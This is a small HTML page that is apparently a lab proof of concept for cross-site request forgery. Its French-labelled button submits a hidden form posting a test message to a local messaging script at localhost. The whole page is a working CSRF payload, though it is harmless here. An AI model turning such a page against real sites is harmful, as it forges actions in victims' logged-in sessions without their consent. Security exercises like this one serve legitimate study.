<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CSRF Attack</title>
</head>
<body>

  <h1>CSRF Attack</h1>
  <button onclick="document.forms[0].submit();">Clique ici </button>
  <form action="http://localhost/senecaille/envoyer_message.php" method="POST">
    <input hidden id="message" name="message" value="Attaque CRSF réussie avec succés">
  </form>
  
</body>
</html>